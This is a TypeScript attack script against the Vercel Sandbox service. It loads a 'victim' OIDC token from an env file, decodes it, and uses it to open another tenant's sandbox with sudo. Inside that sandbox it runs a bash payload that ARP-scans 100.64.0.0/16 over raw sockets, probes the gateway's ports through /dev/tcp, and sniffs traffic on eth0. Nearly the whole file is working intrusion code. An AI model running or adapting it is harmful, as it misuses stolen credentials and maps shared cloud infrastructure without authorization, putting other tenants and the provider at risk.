import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

const EXPLORE = `#!/bin/bash
set +e
echo "===== neighbors already known ====="
ip neigh show 2>&1
echo "===== ARP scan of 100.64.0.0/16 (python raw AF_PACKET) ====="
python3 - <<'PYEOF'
import socket, struct, time, threading
IF = "eth0"
MYMAC = "2e:bc:6a:de:13:92"
MYIP = socket.inet_aton("100.64.12.141")
found = {}
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
s.bind((IF, 0))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVTIMEO, struct.pack("LL", 0, 400000))
stop = threading.Event()
def sender():
    for i in range(1, 65536):
        ip = socket.inet_aton("100.64.%d.%d" % (i >> 8, i & 0xff))
        if ip == MYIP: continue
        pkt = struct.pack("!6s6sH", b"\xff\xff\xff\xff\xff\xff", MYMAC, 0x0806)
        arp = struct.pack("!HHBBH6s4s6s4s", 1, 0x0800, 6, 4, 1, MYMAC, MYIP, b"\x00\x00\x00\x00\x00\x00", ip)
        try: s.send(pkt + arp)
        except Exception: pass
        if i % 8192 == 0:
            time.sleep(0.2)
t = threading.Thread(target=sender); t.daemon=True; t.start()
end = time.time() + 20
while time.time() < end:
    try:
        data = s.recv(4096)
    except socket.timeout:
        continue
    if len(data) < 42: continue
    eth = data[:14]
    arp = data[14:42]
    if arp[0:2] == struct.pack("!H", 1) and arp[6:8] == struct.pack("!H", 0x0800):
        spa = socket.inet_ntoa(arp[14:18])
        sha = ":".join("%02x" % b for b in arp[8:14])
        if spa not in found:
            found[spa] = sha
            print("ARP reply:", spa, sha, flush=True)
print("done, total:", len(found))
PYEOF
echo "===== TCP probe common ports on gateway ====="
for p in 22 80 443 23456 30001 30002 5000 8080 8443 9090 2050; do
  timeout 1 bash -c "echo > /dev/tcp/100.64.0.1/$p" 2>/dev/null && echo "gateway:$p OPEN"
done
echo "===== sniff 5s on eth0 (who is talking) ====="
timeout 5 python3 - <<'PYEOF'
import socket, struct, time
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
s.bind(("eth0", 0))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVTIMEO, struct.pack("LL", 0, 800000))
srcs = {}
end = time.time() + 5
while time.time() < end:
    try:
        data = s.recv(4096)
    except socket.timeout:
        continue
    if len(data) < 14: continue
    eth = data[:14]
    dst, src, etype = struct.unpack("!6s6sH", eth)
    if etype in (0x0800, 0x0806, 0x86DD):
        key = "%s->%s/%04x" % (":".join("%02x"%b for b in src), ":".join("%02x"%b for b in dst), etype)
        srcs[key] = srcs.get(key, 0) + 1
for k, v in sorted(srcs.items(), key=lambda x:-x[1])[:20]:
    print(v, k)
print("sniff done, unique src/dst pairs:", len(srcs))
PYEOF
echo DONE`;

const SCRIPT = `set +e
cat > /tmp/explore17.sh <<'EXPLORE_EOF'
${EXPLORE}
EXPLORE_EOF
sudo unshare -m --propagation private bash /tmp/explore17.sh 2>&1
echo "=== rc: $? ==="
`;

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  const res = await sbx.runCommand("bash", ["-c", SCRIPT], { sudo: true, wait: true, timeout: 120_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });